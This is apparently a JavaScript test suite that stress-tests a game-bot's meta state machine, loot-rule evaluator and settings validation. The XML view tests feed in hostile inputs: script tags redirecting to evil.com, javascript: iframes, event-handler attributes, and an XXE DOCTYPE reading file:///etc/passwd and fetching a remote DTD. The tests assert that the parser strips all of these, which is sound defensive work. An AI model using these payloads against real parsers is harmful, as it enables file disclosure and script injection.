// tests/challenger_m2_empirical_stress.test.mjs — Adversarial empirical stress testing
// of VTank Meta State Machine, Looting .utl Evaluation, and Settings modules for Milestone M2.
//
// 1. Meta State Machine:
//    - CallState recursion attack: call stack overflow (> 64 depth), cap clamping, oldest state drop, warning logging, clean return unwinding.
//    - Pop empty stack attack: Return on empty stack, EnableMeta = false, key release without crashing, lastError logging, pass termination.
//    - Malformed XML view injection: unsupported tags, <script>/<style> bodies dropped, malicious event handlers (onload, onerror, etc.) stripped,
//      nested depth bombs (>32 levels), oversized XML (>128KB), control count limits (>256), DOCTYPE/XXE skip.
// 2. Looting .utl Evaluation:
//    - Corrupted, truncated, and empty .utl rule sets: null/empty profiles, corrupted rule objects, invalid/unknown node types,
//      data type corruption causing BadData, verify zero crashes and graceful fallback.
//    - Unappraised item handling with 3-valued logic (PENDING): appraisal-gated property checks, short-circuiting,
//      transition from PENDING to appraised deterministic booleans, lootDecision and lootVerdict mapping.
// 3. Settings:
//    - Extreme out-of-range option values: upper and lower bound clamping on integers, floats, percentages, and distances.
//    - Negative distances: clamped to schema min values (0 or positive min distance).
//    - NaN, Infinity, -Infinity, non-primitives, and invalid strings: rejected safely without corrupting stored or live values.
//    - Enum validation: rejected on invalid enum choices.
//    - Schema defaults: untouched options strictly read schema defaults, failed sets do not overwrite defaults or existing values,
//      landblock fraction (LBF) conversions under extreme/negative inputs.
//
// Run from apps/holtburger-web/: node tests/challenger_m2_empirical_stress.test.mjs

import assert from "node:assert/strict";
import path from "node:path";
import { fileURLToPath } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));

// ── Modules Under Test ───────────────────────────────────────────────────────
const M = await import("../rynth/vt/meta/index.js");
const { MetaEngine, STACK_CAP, PASS_INTERVAL_MS, normalizeMeta } = M;

const { parseViewXml } = await import("../rynth/vt/formats/view_xml.js");
const { evaluateUtl, lootDecision, lootVerdict } = await import("../rynth/vt/formats/utl_eval.js");
const { UTL_ACTIONS, UTL_NODE_TYPES, utlNodeType, newUtlProfile } = await import("../rynth/vt/formats/utl.js");

const { SCHEMA, LBF_M, coerce, findRow, defaults: schemaDefaults } = await import("../rynth/vt/settings/schema.js");
const { createVtOptions } = await import("../rynth/vt/settings/options.js");
const { ProfileStore } = await import("../rynth/vt/settings/profile_store.js");

// Full bot integration for motion key release verification
class FakeWorker {
  constructor() { this.onmessage = null; }
  postMessage() {}
  terminate() {}
}
if (typeof globalThis.Worker !== "function") globalThis.Worker = FakeWorker;
if (typeof URL.createObjectURL !== "function") URL.createObjectURL = () => "blob:vt-challenger-m2";
if (typeof URL.revokeObjectURL !== "function") URL.revokeObjectURL = () => {};

const { createGrindBot } = await import("../rynth/bot.js");

let pass = 0;
let fail = 0;
const failures = [];

async function check(name, fn) {
  try {
    await fn();
    pass++;
    console.log(`  [OK] ${name}`);
  } catch (e) {
    fail++;
    const errMsg = e && e.stack ? e.stack.split("\n").slice(0, 4).join("\n       ") : String(e);
    failures.push({ name, error: errMsg });
    console.log(`  [FAIL] ${name}\n       ${errMsg}`);
  }
}

// ── Helpers & Test Fixtures ──────────────────────────────────────────────────
const T0 = 1_800_000_000_000;

function fakeStorage() {
  const map = new Map();
  return {
    getItem: (k) => (map.has(k) ? map.get(k) : null),
    setItem: (k, v) => map.set(k, String(v)),
    removeItem: (k) => map.delete(k),
    clear: () => map.clear(),
  };
}

function makeTestEngine({ meta = null, initialEnable = true } = {}) {
  let nowMs = T0;
  const clock = () => nowMs;
  const logged = [];
  const printed = [];
  const released = [];
  const disabledReasons = [];

  const settingsBag = new Map();
  let enableMeta = initialEnable;

  const ctx = {
    now: clock,
    log: (m) => logged.push(String(m)),
    settings: {
      getValue: (k) => (k === "EnableMeta" ? enableMeta : settingsBag.get(k)),
      set: (k, v) => {
        if (k === "EnableMeta") enableMeta = !!v;
        else settingsBag.set(k, v);
      },
      disableMeta: (reason) => {
        enableMeta = false;
        disabledReasons.push(reason);
      },
    },
    world: { wx: 100, wy: 100, z: 0 },
    player: { isReady: () => true },
    portal: { inPortal: () => false },
  };

  const expr = {
    functions: {
      release: (reason) => released.push(reason),
    },
    vars: {
      get: () => 0,
      set: () => {},
    },
  };

  const engine = new MetaEngine({
    ctx,
    expr,
    now: clock,
    log: (m) => printed.push(String(m)),
  });

  if (meta) {
    engine.load(meta);
  }

  const advance = (ms) => {
    nowMs += ms;
    engine.tick(nowMs, { running: true });
  };

  return {
    engine,
    ctx,
    clock,
    advance,
    logged,
    printed,
    released,
    disabledReasons,
    get enableMeta() { return enableMeta; },
    set enableMeta(v) { enableMeta = !!v; },
  };
}

const R = (state, cond, act, extra = {}) => ({ id: `r_${Math.random().toString(36).slice(2, 8)}`, state, enabled: true, cond, act, ...extra });
const M_DEF = (rules, name = "stress_meta") => ({ v: 1, name, rules, navs: {}, warnings: [] });

// Item helper for Looting tests
function makeUtlItem({
  name = "TestItem",
  objectClass = 1,
  hasAppraisal = false,
  ints = {},
  floats = {},
  strs = {},
  spells = null,
  names = null,
  skills = {},
  base = {},
} = {}) {
  const it = {
    name,
    objectClass,
    hasAppraisal,
    intProp: (id) => (id in ints ? ints[id] : null),
    floatProp: (id) => (id in floats ? floats[id] : null),
    strProp: (id) => (id in strs ? strs[id] : null),
    boolProp: () => null,
    didProp: () => null,
    spellIds: () => spells,
    charSkillBuffed: (id) => (id in skills ? skills[id] : null),
    charSkillBase: (id) => (id in base ? base[id] : null),
  };
  if (names !== null && names !== undefined) it.spellNames = () => names;
  return it;
}

console.log("================================================================================");
console.log("   CHALLENGER 2: ADVERSARIAL STRESS TEST SUITE (M2 CAPABILITY VERIFICATION)    ");
console.log("================================================================================");

// ==============================================================================
// 1. CHALLENGE META STATE MACHINE
// ==============================================================================
console.log("\n--- [1] CHALLENGE META STATE MACHINE ---");

await check("CallState recursion attack: attempts stack overflow (> 64 depth) and enforces STACK_CAP clamp", () => {
  const env = makeTestEngine();
  const st = env.engine.st;
  st.state = "State_0";

  // Simulate aggressive deep recursion calls (> 100 CallStates)
  for (let i = 1; i <= 120; i++) {
    const success = env.engine._callState(`State_${i}`, `State_${i - 1}`);
    assert.equal(success, true, `CallState ${i} must succeed`);
    assert.ok(st.stack.length <= STACK_CAP, `Call stack length ${st.stack.length} must never exceed STACK_CAP (${STACK_CAP})`);
  }

  assert.equal(st.stack.length, STACK_CAP, `Call stack must be clamped exactly at STACK_CAP (${STACK_CAP})`);
  assert.equal(st.state, "State_120", "Current state must be the latest target state");

  // Oldest return states must have been dropped (states 0 to 55 dropped, states 56 to 119 retained)
  assert.equal(st.stack[0], "State_56", "Oldest entry in stack must be clamped to oldest retained state");
  assert.equal(st.stack[st.stack.length - 1], "State_119", "Newest entry in stack must be State_119");

  // Warning must have been emitted gracefully
  const stackWarnings = env.printed.filter((m) => m.includes("call stack exceeded 64 entries"));
  assert.equal(stackWarnings.length, 1, "Exactly one warning must be emitted for stack cap overflow (deduplicated via warnOnce)");

  // Verify unwinding works properly after clamp: unwind all 64 frames
  for (let i = STACK_CAP - 1; i >= 0; i--) {
    const popped = env.engine._returnFromCall();
    assert.equal(popped, true, `Return from frame ${i} must succeed`);
    assert.equal(st.stack.length, i, `Stack length must decrement cleanly to ${i}`);
  }
  assert.equal(st.stack.length, 0, "Stack must be empty after 64 returns");
});

await check("Pop empty stack attack: Return on empty stack cleanly disables meta and stops pass without crashing", () => {
  const env = makeTestEngine({ initialEnable: true });
  const st = env.engine.st;
  assert.equal(st.stack.length, 0, "Pre-condition: stack must be empty");

  // Direct empty return
  const result = env.engine._returnFromCall();
  assert.equal(result, false, "Return on empty stack must return false");
  assert.equal(env.enableMeta, false, "EnableMeta must be turned off via disableMeta");
  assert.equal(env.disabledReasons.length, 1, "disableMeta must record reason");
  assert.match(env.disabledReasons[0], /empty call stack/i, "Reason must indicate empty call stack");

  // Engine state checks
  assert.ok(st.lastError, "Engine must record lastError");
  assert.match(st.lastError.msg, /empty call stack/i, "lastError must state empty call stack");
  assert.equal(env.engine._stopPass, true, "_stopPass must be true to abort rule evaluation pass");
});

await check("Pop empty stack attack: meta rule execution terminates cleanly and releases keys", async () => {
  // Integration test with real GrindBot session to verify setMovementInput(0,0,0,0) transmission
  const guid = 0x50000e02;
  const calls = [];
  const rec = (n) => (...a) => calls.push(`${n}(${a.join(",")})`);
  const session = {
    isPlayerReady: () => true,
    playerGuid: () => guid,
    getLocalPlayerPose: () => ({ landblockId: 0xa9b40015, x: 100, y: 100, z: 0, heading: 0, free() {} }),
    objectName: (g) => ((g >>> 0) === guid ? "Challenger" : undefined),
    moveToPosition: rec("moveToPosition"),
    cancelPursuit: rec("cancelPursuit"),
    stopStick: rec("stopStick"),
    pursuitStatus: () => 0,
    sendChat: rec("sendChat"),
    sendTell: rec("sendTell"),
    nearbyEntityGuids: () => [],
    playerKnownSpells: () => [],
    setMovementInput: rec("setMovementInput"),
    turnToHeading: rec("turnToHeading"),
  };

  const bot = await createGrindBot(session, { hz: 10, ai: false });
  let clock = 1_770_000_000_000;
  const tickBot = (count = 1) => {
    for (let i = 0; i < count; i++) {
      clock += 200;
      bot.host._tick();
    }
  };
  tickBot(5);

  const L = bot.vt;
  assert.ok(L, "VT layer attached");

  // Meta with rule 1: press forward; rule 2: Return on empty stack
  const attackMeta = {
    v: 1,
    name: "empty_pop_attack",
    source: { kind: "json" },
    rules: [
      { id: "r1", state: "Default", enabled: true, cond: { t: "Expr", expr: "getvar[step] == 0" }, act: { t: "DoExpr", expr: "setmotion[forward, 1] && setvar[step, 1]" } },
      { id: "r2", state: "Default", enabled: true, cond: { t: "Expr", expr: "getvar[step] == 1" }, act: { t: "Return" } },
      { id: "r3", state: "Default", enabled: true, cond: { t: "Always" }, act: { t: "Chat", msg: "/fail_if_executed" } },
    ],
    navs: {},
    warnings: [],
  };

  L.library.importMeta(attackMeta.name, JSON.stringify(attackMeta), "json");
  L.vars.set("session", "step", 0);
  L.library.loadMeta(attackMeta.name);
  L.options.set("EnableMeta", true, { source: "ui" });

  // Tick to execute forward motion
  tickBot(4);
  const forwardCalls = calls.filter((c) => c.startsWith("setMovementInput") && c.includes("1"));
  assert.ok(forwardCalls.length > 0, "Forward motion was engaged by meta");

  // Tick to trigger Return on empty stack
  L.vars.set("session", "step", 1);
  tickBot(4);

  // Verify EnableMeta was shut down
  assert.equal(L.options.getValue("EnableMeta"), false, "EnableMeta must be cleanly shut down");

  // Verify key release sent all-zero movement input (0,0,0,false)
  const zeroCalls = calls.filter((c) => c === "setMovementInput(0,0,0,false)");
  assert.ok(zeroCalls.length > 0, "Key release must send setMovementInput(0,0,0,false)");

  // Verify r3 was NOT executed (chat was not sent)
  assert.ok(!calls.some((c) => c.includes("/fail_if_executed")), "Subsequent rules must not execute after empty return");
  bot.stop();
});

await check("Malformed XML view injection: scripts, styles, iframes, and HTML tags are completely eliminated", () => {
  const hostileXml = `
    <view title="SafeTitle" width="200" height="300">
      <script>alert("XSS_ATTACK_1")</script>
      <SCRIPT type="text/javascript">document.location="http://evil.com"</SCRIPT>
      <style>body { background: red; }</style>
      <iframe src="javascript:alert(1)"></iframe>
      <img src="invalid.png" onerror="alert(2)" />
      <div class="exploit"><span>Text</span></div>
      <control type="button" name="btn1" left="10" top="10" width="80" height="25" text="Click Me" setstate="Next" />
      <control type="textbox" name="txt1" left="10" top="40" width="100" height="20" text="Safe Text" />
    </view>
  `;

  const res = parseViewXml(hostileXml);
  assert.equal(res.ok, true, `Parsing must succeed safely: ${res.error}`);
  assert.equal(res.model.title, "SafeTitle");
  assert.equal(res.model.width, 200);
  assert.equal(res.model.height, 300);

  // Only the two valid controls must be in the model
  assert.equal(res.model.controls.length, 2, "Only valid <control> elements must survive");
  assert.equal(res.model.controls[0].name, "btn1");
  assert.equal(res.model.controls[0].type, "button");
  assert.equal(res.model.controls[1].name, "txt1");
  assert.equal(res.model.controls[1].type, "textbox");

  // Serialized model must contain zero trace of attack payloads
  const serialized = JSON.stringify(res.model);
  assert.ok(!/XSS|alert|evil|script|style|iframe|img|onerror/i.test(serialized), "No injected scripts or tags must exist in model");

  // Warnings must document dropped elements
  const warnStr = res.warnings.join("\n");
  assert.ok(warnStr.includes("element <script> dropped"), "Warning for dropped <script>");
  assert.ok(warnStr.includes("element <style> dropped"), "Warning for dropped <style>");
  assert.ok(warnStr.includes("element <iframe> dropped"), "Warning for dropped <iframe>");
  assert.ok(warnStr.includes("element <img> dropped"), "Warning for dropped <img>");
  assert.ok(warnStr.includes("element <div> dropped"), "Warning for dropped <div>");
});

await check("Malformed XML view injection: hostile event handlers (onload, onerror, onclick) are stripped", () => {
  const handlerXml = `
    <view title="EventHandlerTest" onload="evil_onload()" onunload="evil_onunload()">
      <control type="button" name="b1" text="Test"
               onclick="evil_onclick()"
               onerror="evil_onerror()"
               onmouseover="evil_hover()"
               onfocus="evil_focus()"
               onblur="evil_blur()"
               onchange="evil_change()"
               onload="evil_ctl_load()"
               setstate="Next"
               actionexpr="chatbox[/hello]" />
    </view>
  `;

  const res = parseViewXml(handlerXml);
  assert.equal(res.ok, true, res.error);
  assert.equal(res.model.controls.length, 1);

  const ctl = res.model.controls[0];
  // Valid whitelisted attributes must remain
  assert.equal(ctl.name, "b1");
  assert.equal(ctl.text, "Test");
  assert.equal(ctl.setstate, "Next");
  assert.equal(ctl.actionexpr, "chatbox[/hello]");

  // Event handlers must be completely absent from object keys
  const keys = Object.keys(ctl);
  for (const k of keys) {
    assert.ok(!/^on/i.test(k), `Event handler ${k} must not exist on control`);
  }

  // Warnings must confirm dropping
  const w = res.warnings.join("\n");
  assert.ok(w.includes("event attribute onload on <view> dropped"));
  assert.ok(w.includes("event attribute onclick on <control> dropped"));
  assert.ok(w.includes("event attribute onerror on <control> dropped"));
  assert.ok(w.includes("event attribute onmouseover on <control> dropped"));
});

await check("Malformed XML view injection: depth bomb, control flood, oversize XML, XXE/DOCTYPE skip", () => {
  // 1. Nested depth bomb (> 32 levels)
  let deepXml = '<view title="Deep">';
  for (let i = 0; i < 40; i++) deepXml += '<control type="layout">';
  deepXml += '<control type="button" name="deepBtn" text="Deep" />';
  for (let i = 0; i < 40; i++) deepXml += '</control>';
  deepXml += '</view>';

  const deepRes = parseViewXml(deepXml);
  assert.equal(deepRes.ok, false, "Nesting deeper than 32 must fail");
  assert.match(deepRes.error, /nested deeper than 32/i, "Error message must indicate depth exceeded");

  // 2. Control count flood (> 256 controls)
  let floodXml = '<view title="Flood">';
  for (let i = 0; i < 300; i++) {
    floodXml += `<control type="button" name="btn_${i}" text="B${i}" />`;
  }
  floodXml += '</view>';

  const floodRes = parseViewXml(floodXml);
  assert.equal(floodRes.ok, true, "Large control sets parse without crashing");
  assert.equal(floodRes.model.controls.length, 256, "Controls must be clamped strictly to 256");
  assert.ok(floodRes.warnings.some((w) => w.includes("more than 256 controls")), "Warning about dropped controls");

  // 3. Oversize XML (> 128 KB)
  const hugeXml = `<view title="Huge">${"<!-- padding -->".repeat(10000)}</view>`;
  assert.ok(hugeXml.length > 128 * 1024, "XML size must be > 128 KB");
  const hugeRes = parseViewXml(hugeXml);
  assert.equal(hugeRes.ok, false, "Oversized XML must be rejected");
  assert.match(hugeRes.error, /larger than 131072 bytes/i);

  // 4. XXE / DOCTYPE injection
  const xxeXml = `<?xml version="1.0"?>
    <!DOCTYPE root [
      <!ELEMENT root ANY >
      <!ENTITY xxe SYSTEM "file:///etc/passwd" >
      <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
      %dtd;
    ]>
    <view title="XXE &xxe;">
      <control type="label" text="&xxe;" />
    </view>
  `;
  const xxeRes = parseViewXml(xxeXml);
  assert.equal(xxeRes.ok, true, "XXE DOCTYPE must be safely skipped");
  assert.ok(xxeRes.warnings.some((w) => w.includes("DOCTYPE skipped")));
  // &xxe; entity is not expanded
  assert.equal(xxeRes.model.title, "XXE &xxe;");

  // 5. Malformed inputs: non-strings and broken tags
  assert.equal(parseViewXml(null).ok, false);
  assert.equal(parseViewXml(undefined).ok, false);
  assert.equal(parseViewXml(12345).ok, false);
  assert.equal(parseViewXml("").ok, false);
  assert.equal(parseViewXml("   ").ok, false);
  assert.equal(parseViewXml("<view><control name='unclosed'").ok, false);
  assert.equal(parseViewXml("<view><!-- unterminated comment").ok, false);
});

// ==============================================================================
// 2. CHALLENGE LOOTING .UTL EVALUATION
// ==============================================================================
console.log("\n--- [2] CHALLENGE LOOTING .UTL EVALUATION ---");

await check("Corrupted, truncated, and empty .utl rule sets: zero crashes and graceful fallback", () => {
  const dummyItem = makeUtlItem({ hasAppraisal: true });

  // 1. null, undefined, empty object, missing rules
  assert.deepEqual(evaluateUtl(null, dummyItem), { action: null });
  assert.deepEqual(evaluateUtl(undefined, dummyItem), { action: null });
  assert.deepEqual(evaluateUtl({}, dummyItem), { action: null });
  assert.deepEqual(evaluateUtl({ rules: null }, dummyItem), { action: null });
  assert.deepEqual(evaluateUtl({ rules: [] }, dummyItem), { action: null });

  // 2. Corrupted rule objects (null entries, non-objects, missing/non-array conditions)
  const corruptedProfile1 = {
    version: 1,
    rules: [
      null,
      undefined,
      "not a rule object",
      12345,
      { name: "Broken1", enabled: true, action: "Keep", conditions: null },
      { name: "Broken2", enabled: true, action: "Keep", conditions: "not an array" },
      { name: "Broken3", enabled: true, action: "Keep", conditions: [null, undefined, 42, "corrupt"] },
    ],
  };

  const res1 = evaluateUtl(corruptedProfile1, dummyItem);
  assert.equal(res1.action, "keep", "Broken1 with null conditions matches as no conditions");

  // 3. Invalid / unknown node types
  const corruptedProfile2 = {
    version: 1,
    rules: [
      { name: "BadNodeType1", enabled: true, action: "Keep", conditions: [{ type: -1, data: [] }] },
      { name: "BadNodeType2", enabled: true, action: "Keep", conditions: [{ type: 99999, data: [] }] },
      { name: "BadNodeType3", enabled: true, action: "Keep", conditions: [{ type: NaN, data: [] }] },
      { name: "BadNodeType4", enabled: true, action: "Keep", conditions: [{ type: "bad", data: [] }] },
    ],
  };

  const res2 = evaluateUtl(corruptedProfile2, dummyItem);
  assert.equal(res2.action, null, "Rules with invalid node types must not match");
  assert.ok(res2.unsupported.some((u) => u.includes("unknown node type -1")));
  assert.ok(res2.unsupported.some((u) => u.includes("unknown node type 99999")));

  // 4. Node data corruption causing BadData (integers and floats given non-numeric strings)
  const corruptedProfile3 = {
    version: 1,
    rules: [
      // Node 2 = LongValKeyLE (int value, key)
      { name: "BadIntData", enabled: true, action: "Keep", conditions: [{ type: 2, data: ["not-an-int", "19"] }] },
      // Node 4 = DoubleValKeyGE (float value, key)
      { name: "BadFloatData", enabled: true, action: "Keep", conditions: [{ type: 4, data: ["not-a-float", "5"] }] },
      // Fallback rule
      { name: "ValidFallback", enabled: true, action: "Sell", conditions: [] },
    ],
  };

  const res3 = evaluateUtl(corruptedProfile3, dummyItem);
  assert.equal(res3.action, "sell", "Corrupted rules must be skipped cleanly due to BadData and fallback reached");
  assert.ok(res3.unsupported.some((u) => u.includes("is not an integer")));
  assert.ok(res3.unsupported.some((u) => u.includes("is not a number")));

  // 5. lootDecision and lootVerdict on corrupted results
  assert.deepEqual(lootDecision(null), { verdict: "skip", action: null, rule: null });
  assert.deepEqual(lootDecision({}), { verdict: "skip", action: null, rule: null });
  assert.deepEqual(lootDecision({ action: "unknown_action", rule: "r" }), { verdict: "pickup", action: "unknown_action", rule: "r" });
  assert.equal(lootVerdict(null), "skip");
});

await check("Unappraised item handling with 3-valued logic (PENDING): evaluation, short-circuit, and transitions", () => {
  // Test item: unappraised (hasAppraisal = false), name is known, but int/float properties are unknown (null)
  const unappraisedItem = makeUtlItem({
    name: "Unappraised Bow",
    objectClass: 3, // Missile
    hasAppraisal: false,
    ints: {}, // property 44 (Max Damage) is null
    floats: {},
  });

  // Rule 1: ObjectClass == 3 (Missile) AND MaxDamage >= 40 (Property 44)
  // Condition 1 matches (true); Condition 2 needs unappraised property -> PENDING
  const profile = {
    version: 1,
    rules: [
      {
        name: "DamageCheck",
        enabled: true,
        action: "Keep",
        conditions: [
          { type: 7, data: ["3"] },       // ObjectClass == 3 (true)
          { type: 2006, data: ["40"] },   // MaxDamage >= 40 (Property 44, unappraised -> PENDING)
        ],
      },
      {
        name: "CatchAll",
        enabled: true,
        action: "Sell",
        conditions: [], // Always matches if reached
      },
    ],
  };

  const res1 = evaluateUtl(profile, unappraisedItem);
  assert.equal(res1.action, null, "When pending, action must be null");
  assert.equal(res1.pending, true, "Result must have pending: true");
  assert.equal(res1.rule, "DamageCheck", "Pending rule must be identified");

  const decision1 = lootDecision(res1);
  assert.equal(decision1.verdict, "pending", "lootDecision verdict must be 'pending'");
  assert.equal(decision1.action, null);
  assert.equal(lootVerdict(res1), "pending");

  // Short-circuit verification:
  // If a condition in the rule is definitely false, the rule is false regardless of PENDING condition
  const profileWithFalse = {
    version: 1,
    rules: [
      {
        name: "MismatchedRule",
        enabled: true,
        action: "Keep",
        conditions: [
          { type: 7, data: ["1"] },       // ObjectClass == 1 (Melee) -> FALSE for Missile
          { type: 2006, data: ["40"] },   // PENDING
        ],
      },
      {
        name: "NextValidRule",
        enabled: true,
        action: "Keep",
        conditions: [
          { type: 7, data: ["3"] },       // ObjectClass == 3 (Missile) -> TRUE
        ],
      },
    ],
  };

  const res2 = evaluateUtl(profileWithFalse, unappraisedItem);
  assert.equal(res2.pending, undefined, "Must NOT be pending because first rule was definitely false");
  assert.equal(res2.action, "keep");
  assert.equal(res2.rule, "NextValidRule");

  // Reverse condition order: PENDING followed by FALSE must also not block evaluation
  const profilePendingThenFalse = {
    version: 1,
    rules: [
      {
        name: "PendingThenFalse",
        enabled: true,
        action: "Keep",
        conditions: [
          { type: 2006, data: ["40"] },   // PENDING
          { type: 7, data: ["1"] },       // FALSE
        ],
      },
      {
        name: "FallbackAfterPendingFalse",
        enabled: true,
        action: "Sell",
        conditions: [],
      },
    ],
  };

  const res3 = evaluateUtl(profilePendingThenFalse, unappraisedItem);
  assert.equal(res3.pending, undefined, "Rule with PENDING and FALSE must resolve to FALSE");
  assert.equal(res3.action, "sell");
  assert.equal(res3.rule, "FallbackAfterPendingFalse");

  // Transition to Appraised:
  // Once item.hasAppraisal = true, missing property 44 defaults to 0
  const appraisedItem = makeUtlItem({
    name: "Unappraised Bow",
    objectClass: 3,
    hasAppraisal: true,
    ints: { 44: 55 }, // Now appraised with Max Damage 55
  });

  const resAppraisedMatch = evaluateUtl(profile, appraisedItem);
  assert.equal(resAppraisedMatch.pending, undefined);
  assert.equal(resAppraisedMatch.action, "keep");
  assert.equal(resAppraisedMatch.rule, "DamageCheck");

  const appraisedItemLowDamage = makeUtlItem({
    name: "Unappraised Bow",
    objectClass: 3,
    hasAppraisal: true,
    ints: { 44: 25 }, // Low damage (25 < 40)
  });

  const resAppraisedLow = evaluateUtl(profile, appraisedItemLowDamage);
  assert.equal(resAppraisedLow.pending, undefined);
  assert.equal(resAppraisedLow.action, "sell", "Evaluates to false on rule 1, falls through to rule 2");
  assert.equal(resAppraisedLow.rule, "CatchAll");
});

// ==============================================================================
// 3. CHALLENGE SETTINGS
// ==============================================================================
console.log("\n--- [3] CHALLENGE SETTINGS ---");

await check("Extreme out-of-range option values: upper and lower bound clamping", () => {
  const monsterRow = findRow("MonsterRange").row;
  assert.equal(monsterRow.min, 1);
  assert.equal(monsterRow.max, 200);

  // Exceed upper bound
  const cHigh = coerce(monsterRow, 999999);
  assert.equal(cHigh.ok, true);
  assert.equal(cHigh.value, 200, "Values above max must clamp to row.max");
  assert.equal(cHigh.clamped, true);

  // Exceed lower bound
  const cLow = coerce(monsterRow, 0);
  assert.equal(cLow.ok, true);
  assert.equal(cLow.value, 1, "Values below min must clamp to row.min");
  assert.equal(cLow.clamped, true);

  // ApproachRange [0, 200]
  const approachRow = findRow("ApproachRange").row;
  assert.equal(coerce(approachRow, -50).value, 0);
  assert.equal(coerce(approachRow, 500).value, 200);

  // FollowNavMin [0.5, 20]
  const followRow = findRow("FollowNavMin").row;
  assert.equal(coerce(followRow, -10).value, 0.5);
  assert.equal(coerce(followRow, 50).value, 20);

  // Percentage vitals: HealAt [0, 100]
  const healRow = findRow("HealAt").row;
  assert.equal(coerce(healRow, -20).value, 0);
  assert.equal(coerce(healRow, 150).value, 100);

  // Integer rounding check: int type options must round to integer
  const petMinRow = findRow("PetMinMonsters").row; // int [1, 20]
  assert.equal(coerce(petMinRow, 3.7).value, 4, "Integer option must round 3.7 to 4");
  assert.equal(coerce(petMinRow, 3.2).value, 3, "Integer option must round 3.2 to 3");
});

await check("Negative distances: strict clamping to schema minimum distances", () => {
  const distanceKeys = [
    { key: "MonsterRange", min: 1 },
    { key: "RingRange", min: 1 },
    { key: "ApproachRange", min: 0 },
    { key: "FollowNavMin", min: 0.5 },
    { key: "CustomPetRange", min: 1 },
    { key: "CorpseApproachRangeMax", min: 1 },
    { key: "OpenDoorRange", min: 0.5 },
    { key: "HelperHealDistance", min: 0 },
    { key: "HelperRestamDistance", min: 0 },
    { key: "HelperInfuseDistance", min: 0 },
  ];

  for (const { key, min } of distanceKeys) {
    const f = findRow(key);
    assert.ok(f, `Option row for ${key} must exist`);
    const cNeg = coerce(f.row, -100);
    assert.equal(cNeg.ok, true, `Coerce for ${key} with -100 must succeed`);
    assert.equal(cNeg.value, min, `Negative distance for ${key} must clamp to min (${min})`);
    assert.equal(cNeg.clamped, true);
  }
});

await check("NaN, Infinity, -Infinity, non-primitives, and invalid inputs: rejected without mutating state", () => {
  const store = fakeStorage();
  const profiles = new ProfileStore({ storage: store, scope: "challenger_test", charName: "Tester" });
  const opts = createVtOptions({ profiles });

  const initialMonsterRange = opts.getValue("MonsterRange");
  assert.equal(initialMonsterRange, 40, "Initial default value must be 40");

  const invalidInputs = [
    NaN,
    Infinity,
    -Infinity,
    "not_a_number",
    "",
    "   ",
    null,
    undefined,
    {},
    { val: 50 },
    [],
    [10],
  ];

  for (const bad of invalidInputs) {
    const res = opts.set("MonsterRange", bad);
    assert.equal(res.ok, false, `Setting invalid input ${String(bad)} must fail`);
    assert.ok(res.error, "Failure must provide an error message");
    // Verify stored and live values remain unchanged
    assert.equal(opts.getValue("MonsterRange"), 40, `Value must remain 40 after bad input ${String(bad)}`);
    assert.equal(opts.storedValue("MonsterRange"), 40);
  }

  // Boolean options rejection of bad values
  const badBools = [NaN, Infinity, {}, [], "maybe", "unknown"];
  for (const bad of badBools) {
    const res = opts.set("EnableCombat", bad);
    assert.equal(res.ok, false, `Setting bad bool ${String(bad)} must fail`);
    assert.equal(opts.getValue("EnableCombat"), true, "EnableCombat must remain unchanged");
  }
});

await check("Enum validation: strictly rejects unauthorized enum choices", () => {
  const store = fakeStorage();
  const profiles = new ProfileStore({ storage: store, scope: "challenger_enum", charName: "Tester" });
  const opts = createVtOptions({ profiles });

  // WarSpellMode: ["legacy", "vtank"]
  assert.equal(opts.getValue("WarSpellMode"), "legacy");

  const validVtank = opts.set("WarSpellMode", "vtank");
  assert.equal(validVtank.ok, true);
  assert.equal(opts.getValue("WarSpellMode"), "vtank");

  const invalidSpellModes = ["auto", "godmode", 123, true, "", null, undefined];
  for (const bad of invalidSpellModes) {
    const res = opts.set("WarSpellMode", bad);
    assert.equal(res.ok, false, `WarSpellMode set with ${bad} must fail`);
    assert.equal(opts.getValue("WarSpellMode"), "vtank", "WarSpellMode must retain previous valid value");
  }

  // AttackHeight: [1, 2, 3]
  assert.equal(opts.getValue("AttackHeight"), 2);
  assert.equal(opts.set("AttackHeight", 1).ok, true);
  assert.equal(opts.getValue("AttackHeight"), 1);

  const invalidHeights = [0, 4, -1, 2.5, "high", "medium", null];
  for (const bad of invalidHeights) {
    const res = opts.set("AttackHeight", bad);
    assert.equal(res.ok, false, `AttackHeight set with ${bad} must fail`);
    assert.equal(opts.getValue("AttackHeight"), 1);
  }
});

await check("Schema clamping & fallback to defaults: unconfigured options and LBF conversions", () => {
  const store = fakeStorage();
  const profiles = new ProfileStore({ storage: store, scope: "challenger_defaults", charName: "Tester" });
  const opts = createVtOptions({ profiles });

  // Verify schema defaults are returned for all options initially
  const dflts = schemaDefaults();
  for (const [k, d] of Object.entries(dflts)) {
    assert.deepEqual(opts.getValue(k), d, `Option ${k} must equal schema default`);
  }

  // Landblock Fraction (LBF) conversion testing under extreme inputs:
  // AttackDistance is VTank name for MonsterRange (vtUnit: "lbf", LBF_M = 240)
  // Setting via VTank name multiplies by 240, then clamps to [1, 200]
  const fVt = findRow("AttackDistance");
  assert.ok(fVt && fVt.viaVt, "AttackDistance must be resolved via VTank name");

  // -5 LBF = -1200m -> clamped to 1m
  const setNegVt = opts.set("AttackDistance", -5);
  assert.equal(setNegVt.ok, true);
  assert.equal(opts.getValue("MonsterRange"), 1, "Negative LBF input must clamp to 1m");

  // 10 LBF = 2400m -> clamped to 200m
  const setHighVt = opts.set("AttackDistance", 10);
  assert.equal(setHighVt.ok, true);
  assert.equal(opts.getValue("MonsterRange"), 200, "Excessive LBF input must clamp to 200m");

  // Read back in VTank units (200 / 240 = 0.8333333333333334)
  const getVt = opts.get("AttackDistance", { vtUnits: true });
  assert.equal(getVt.ok, true);
  assert.equal(getVt.value, 200 / LBF_M, "get() with vtUnits must present converted value");

  // Normal in-range setting: 0.1666667 LBF * 240 ~= 40m
  const setNormVt = opts.set("AttackDistance", 0.1666667);
  assert.equal(setNormVt.ok, true);
  assert.equal(Math.round(opts.getValue("MonsterRange")), 40);
});

console.log("\n================================================================================");
console.log(`SUMMARY: ${pass} passed, ${fail} failed out of ${pass + fail} checks`);
console.log("================================================================================");

if (fail > 0) {
  console.error("\nFAILURES:");
  for (const f of failures) {
    console.error(`- ${f.name}: ${f.error}`);
  }
  process.exit(1);
} else {
